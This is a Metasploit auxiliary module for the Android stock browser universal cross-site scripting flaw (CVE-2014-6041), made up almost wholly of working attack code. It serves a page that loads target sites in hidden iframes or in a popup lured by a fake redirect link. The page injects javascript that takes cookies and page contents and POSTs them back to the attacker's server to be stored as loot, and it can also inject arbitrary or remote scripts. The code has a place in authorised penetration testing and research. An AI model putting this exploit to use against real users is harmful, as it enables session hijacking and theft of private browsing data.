##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',
      'Description'    => %q{
        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
        all versions of Android's open source stock browser before 4.4, and Android apps running
        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
        to scrape both cookie data and page contents from a vulnerable browser window.

        If your target URLs use X-Frame-Options, you can enable the "BYPASS_XFO" option,
        which will cause a popup window to be used. This requires a click from the user
        and is much less stealthy, but is generally harmless-looking.

        By supplying a CUSTOM_JS parameter and ensuring CLOSE_POPUP is set to false, this
        module also allows running aribtrary javascript in the context of the targeted URL.
        Some sample UXSS scripts are provided in data/exploits/uxss.
      },
      'Author'         => [
        'Rafay Baloch', # Original discovery, disclosure
        'joev'          # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'Actions'        => [
        [ 'WebServer' ]
      ],
      'PassiveActions' => [
        'WebServer'
      ],
      'References' => [
        [ 'URL', 'http://1337day.com/exploit/description/22581' ],
        [ 'OSVDB', '110664' ],
        [ 'CVE', '2014-6041' ]
      ],
      'DefaultAction'  => 'WebServer'
    ))

    register_options([
      OptString.new('TARGET_URLS', [
        true,
        "The comma-separated list of URLs to steal.",
        'http://example.com'
      ]),
      OptString.new('CUSTOM_JS', [
        false,
        "A string of javascript to execute in the context of the target URLs.",
        ''
      ]),
      OptString.new('REMOTE_JS', [
        false,
        "A URL to inject into a script tag in the context of the target URLs.",
        ''
      ]),
      OptBool.new('BYPASS_XFO', [
        false,
        "Bypass URLs that have X-Frame-Options by using a one-click popup exploit.",
        false
      ]),
      OptBool.new('CLOSE_POPUP', [
        false,
        "When BYPASS_XFO is enabled, this closes the popup window after exfiltration.",
        true
      ])
    ])
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")

    if request.method.downcase == 'post'
      collect_data(request)
      send_response_html(cli, '')
    else
      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))
      domains = datastore['TARGET_URLS'].split(',')

      html = <<-EOS
  <html>
    <body>
      <script>
        var targets = JSON.parse(atob("#{Rex::Text.encode_base64(JSON.generate(domains))}"));
        var bypassXFO = #{datastore['BYPASS_XFO']};
        var received = [];

        window.addEventListener('message', function(e) {
          var data = JSON.parse(e.data);
          if (!data.send) {
            if (bypassXFO && data.i && received[data.i]) return;
            if (bypassXFO && e.data) received.push(true);
          }
          var x = new XMLHttpRequest;
          x.open('POST', window.location, true);
          x.send(e.data);
        }, false);

        function randomString() {
          var str = '';
          for (var i = 0; i < 5+Math.random()*15; i++) {
            str += String.fromCharCode('A'.charCodeAt(0) + parseInt(Math.random()*26))
          }
          return str;
        }

        function installFrame(target) {
          var f = document.createElement('iframe');
          var n = randomString();
          f.setAttribute('name', n);
          f.setAttribute('src', target);
          f.setAttribute('style', 'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px');
          f.onload = function(){
            attack(target, n);
          };
          document.body.appendChild(f);
        }

        function attack(target, n, i, cachedN) {
          var exploit = function(){
            window.open('\\u0000javascript:if(document&&document.body){(opener||top).postMessage('+
              'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+
              'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(custom_js)}"'+
              '));}void(0);', n);
          }
          if (!n) {
            n = cachedN || randomString();
            var closePopup = #{datastore['CLOSE_POPUP']};
            var w = window.open(target, n);
            var deadman = setTimeout(function(){
              clearInterval(clear);
              clearInterval(clear2);
              attack(targets[i], null, i, n);
            }, 10000);
            var clear = setInterval(function(){
              if (received[i]) {
                if (i < targets.length-1) {
                  try{ w.stop(); }catch(e){}
                  try{ w.location='data:text/html,<p>Loading...</p>'; }catch(e){}
                }

                clearInterval(clear);
                clearInterval(clear2);
                clearTimeout(deadman);

                if (i < targets.length-1) {
                  setTimeout(function(){ attack(targets[i+1], null, i+1, n); },100);
                } else {
                  if (closePopup) w.close();
                }
              }
            }, 50);
            var clear2 = setInterval(function(){
              try {
                if (w.location.toString()) return;
                if (w.document) return;
              } catch(e) {}
              clearInterval(clear2);
              clear2 = setInterval(exploit, 50);
            },20);
          } else {
            exploit();
          }
        }

        var clickedOnce = false;
        function onclickHandler() {
          if (clickedOnce) return false;
          clickedOnce = true;
          attack(targets[0], null, 0);
          return false;
        }

        window.onload = function(){
          if (bypassXFO) {
            document.querySelector('#click').style.display='block';
            window.onclick = onclickHandler;
          } else {
            for (var i = 0; i < targets.length; i++) {
              installFrame(targets[i]);
            }
          }
        }
      </script>
      <div style='text-align:center;margin:20px 0;font-size:22px;display:none'
           id='click' onclick='onclickHandler()'>
        The page has moved. <a href='#'>Click here to be redirected.</a>
      </div>
    </body>
  </html>
      EOS

      print_status("Sending initial HTML ...")
      send_response_html(cli, html)
    end
  end

  def collect_data(request)
    response = JSON.parse(request.body)
    url = response['url']
    if response && url
      file = store_loot("android.client", "text/plain", cli.peerhost, request.body, "aosp_uxss_#{url}", "Data pilfered from uxss")
      print_good "Collected data from URL: #{url}"
      print_good "Saved to: #{file}"
    end
  end

  def backend_url
    proto = (datastore["SSL"] ? "https" : "http")
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
  end

  def custom_js
    rjs_hook + datastore['CUSTOM_JS']
  end

  def rjs_hook
    remote_js = datastore['REMOTE_JS']
    if remote_js.present?
      "var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); "
    else
      ''
    end
  end

  def run
    exploit
  end
end
